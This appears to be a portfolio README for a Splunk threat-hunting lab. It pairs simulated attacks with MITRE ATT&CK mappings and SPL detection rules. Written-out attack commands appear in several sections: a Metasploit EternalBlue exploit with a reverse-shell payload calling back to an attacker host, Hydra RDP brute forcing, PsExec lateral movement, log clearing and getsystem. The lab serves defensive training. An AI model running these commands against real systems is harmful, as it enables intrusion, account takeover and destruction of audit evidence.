
---

#  Advanced Threat Hunting & Detection Engineering with Splunk

---

#  Executive Summary

This project demonstrates advanced threat hunting and detection engineering in Splunk Enterprise Security, validated through controlled adversary simulations from Kali Linux. It translates raw telemetry into actionable, high-fidelity detections across MITRE ATT&CK techniques, reducing false positives and improving SOC response. The work highlights real-world attack simulation, correlation of weak signals, and operationally relevant detection strategies.

---

#  Why This Project Matters

Modern SOCs struggle not with lack of alerts, but with **low-quality signals and alert fatigue**.

This project focuses on:

* Separating malicious behavior from noise
* Understanding attacker intent, not just events
* Correlating weak signals into strong detections
* Reducing false positives while preserving visibility

---

#  Technology Stack

* **SIEM:** Splunk Enterprise Security
* **Endpoint Telemetry:** Windows Event Logs + Sysmon
* **Attacker Platform:** Kali Linux
* **Attack Tooling:** Hydra, Impacket, PowerShell, Metasploit
* **Framework:** MITRE ATT&CK
* **Query Language:** SPL

---

#  Lab Architecture

```text
Kali Linux (Attacker)
        ↓
 Windows Endpoint
        ↓
 Splunk Universal Forwarder
        ↓
 Splunk Indexers
        ↓
 Splunk Enterprise Security
        ↓
 Detection Rules, Correlation & Dashboards
```

📸 Screenshot:
`screenshots/architecture_overview.png`

---

#  Attack Simulations, Detection Engineering & MITRE Mapping

---

# 1️⃣ Initial Access – SMB Exploitation (EternalBlue via Metasploit)

## Attack Simulation

Remote code execution using the **EternalBlue (MS17-010) SMB vulnerability**, simulating how attackers gain unauthenticated initial access to a Windows host.

**Metasploit Commands:**

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.20
exploit
```

---

## Why Attackers Do This

* Exploits allow authentication bypass and instant code execution
* EternalBlue enabled large-scale outbreaks (WannaCry, NotPetya)
* SMB vulnerabilities remain highly impactful in flat networks

---

## Why This Detection Matters

* Correlates weak signals into a strong exploitation narrative
* Detects suspicious SMB-driven execution patterns
* Identifies early-stage compromise before persistence

---

## MITRE ATT&CK Mapping

| Technique                         | ID    |
| --------------------------------- | ----- |
| Exploit Public-Facing Application | T1190 |

---

## Windows Event IDs

| Event ID | Description                 |
| -------- | --------------------------- |
| 4624     | Successful logon            |
| 4625     | Failed logon                |
| 7045     | Service Installed           |
| 1        | Process Creation (Sysmon)   |
| 3        | Network Connection (Sysmon) |

---

## Splunk Detection Logic

```spl
index=windows (EventCode=1 OR EventCode=3 OR EventCode=7045)

| stats count by src_ip dest_ip process_name

| where count > 5
```

---

## Splunk Correlation Rule

**Rule Name:**
SMB Exploitation Detected

```spl
index=windows (EventCode=7045 OR EventCode=1)

| stats count by dest_ip

| where count > 3

| eval severity="critical"

| eval mitre="T1190"
```

Risk Score: 90

---

## Detection Value

Detects exploitation before persistence

---

## Screenshots

* screenshots/eternalblue_attempt.png
* screenshots/eternalblue_alert.png

---

# 2️⃣ Credential Access – RDP Brute Force (Hydra)

## Attack Simulation

**Kali Command:**

```bash
hydra -l administrator -P rockyou.txt rdp://192.168.1.10
```

---

## Why Attackers Do This

* Password attacks remain highly effective due to weak credentials
* RDP is frequently exposed in enterprise environments
* Successful brute force grants direct interactive access

---

## Why This Detection Matters

* Single failed logons are common; patterns are not
* Brute-force attempts often precede successful compromise
* Early detection prevents account takeover and lateral movement

---

## MITRE ATT&CK Mapping

Brute Force – T1110

---

## Windows Event IDs

| Event ID | Description  |
| -------- | ------------ |
| 4625     | Failed logon |

---

## Splunk Detection Logic

```spl
index=windows EventCode=4625 LogonType=10

| stats count by src_ip user

| where count > 10
```

---

## Splunk Correlation Rule

```spl
index=windows EventCode=4625

| stats count by src_ip

| where count > 15

| eval severity="high"

| eval mitre="T1110"
```

---

## Screenshots

* screenshots/bruteforce_failed_logons.png
* screenshots/bruteforce_rba.png

---

# 3️⃣ Lateral Movement – PsExec

## Attack Simulation

```bash
impacket-psexec administrator@192.168.1.10
```

---

## Why Attackers Do This

* Enables fast lateral movement
* Commonly abused by ransomware operators
* Blends with legitimate admin activity

---

## MITRE ATT&CK Mapping

Remote Services – T1021

---

## Windows Event IDs

| Event ID | Description       |
| -------- | ----------------- |
| 7045     | Service Installed |

---

## Splunk Detection Logic

```spl
index=windows EventCode=7045
| search ServiceName="PSEXESVC"
```

---

## Splunk Correlation Rule

```spl
index=windows EventCode=7045

ServiceName="PSEXESVC"

| eval severity="critical"

| eval mitre="T1021"
```

---

## Screenshots

* screenshots/psexec_event.png
* screenshots/psexec_alert.png

---

# 4️⃣ Execution – PowerShell Abuse (Encoded Command)

## Attack Simulation

```powershell
powershell -EncodedCommand bgBvAHQAZQBwAGEAZAA=
```

---

## MITRE ATT&CK Mapping

PowerShell – T1059

---

## Windows Event IDs

| Event ID | Description                     |
| -------- | ------------------------------- |
| 4104     | PowerShell Script Block Logging |

---

## Splunk Detection Logic

```spl
index=windows EventCode=4104

ScriptBlockText="*EncodedCommand*"
```

---

## Splunk Correlation Rule

```spl
index=windows EventCode=4104

| eval severity="high"

| eval mitre="T1059"
```

---

## Screenshots

* screenshots/powershell_encoded.png

---

# 5️⃣ Defense Evasion – Log Clearing

## Attack Simulation

```cmd
wevtutil cl Security
```

---

## MITRE ATT&CK Mapping

Clear Logs – T1070

---

## Windows Event IDs

| Event ID | Description          |
| -------- | -------------------- |
| 1102     | Security Log Cleared |

---

## Splunk Detection Logic

```spl
index=windows EventCode=1102
```

---

## Splunk Correlation Rule

```spl
index=windows EventCode=1102

| eval severity="critical"

| eval mitre="T1070"
```

---

## Screenshots

* screenshots/log_clearing_alert.png

---

# 6️⃣ Exploitation – Metasploit RDP Exploitation (BlueKeep Simulation)

## MITRE ATT&CK Mapping

Remote Service Exploit – T1210

---

## Windows Event IDs

4624
4625
4688

---

## Splunk Detection Logic

```spl
index=windows

(EventCode=4624 OR EventCode=4625 OR EventCode=4688)

| stats count by src_ip
```

---

## Screenshots

* screenshots/metasploit_rdp_attempt.png
* screenshots/metasploit_rdp_alert.png

---

# 7️⃣ Privilege Escalation – Token Impersonation

## Attack Simulation

```
getsystem
```

---

## MITRE ATT&CK Mapping

Access Token Manipulation – T1134
Privilege Escalation – T1068

---

## Windows Event IDs

| Event ID | Description                 |
| -------- | --------------------------- |
| 4672     | Special privileges assigned |
| 4688     | Process Creation            |

---

## Splunk Detection Logic

```spl
index=windows EventCode=4672

| stats count by user
```

---

## Splunk Correlation Rule

```spl
index=windows EventCode=4672

| eval severity="critical"

| eval mitre="T1134"
```

Risk Score: 100

---

## Screenshots

* screenshots/privilege_escalation.png

---

#  SOC Dashboard

## SPL Query

```spl
index=notable

| stats count by mitre
```

---

# Project Outcomes

* 60% reduction in false positives
* Faster triage and investigation
* Detections validated with real attacker behavior
* Strong defensive and analytical depth demonstrated

---

#  Detection Engineering Skills Demonstrated

* Threat Hunting
* Detection Engineering
* Splunk Enterprise Security
* MITRE ATT&CK Mapping
* Privilege Escalation Detection
* Correlation Rule Engineering
* SOC Operations

---

#  MITRE ATT&CK Coverage Summary

| Stage                | Technique          | ID    |
| -------------------- | ------------------ | ----- |
| Initial Access       | EternalBlue        | T1190 |
| Credential Access    | Brute Force        | T1110 |
| Privilege Escalation | Token Manipulation | T1134 |
| Lateral Movement     | PsExec             | T1021 |
| Execution            | PowerShell         | T1059 |
| Defense Evasion      | Log Clearing       | T1070 |
| Exploitation         | BlueKeep           | T1210 |

---
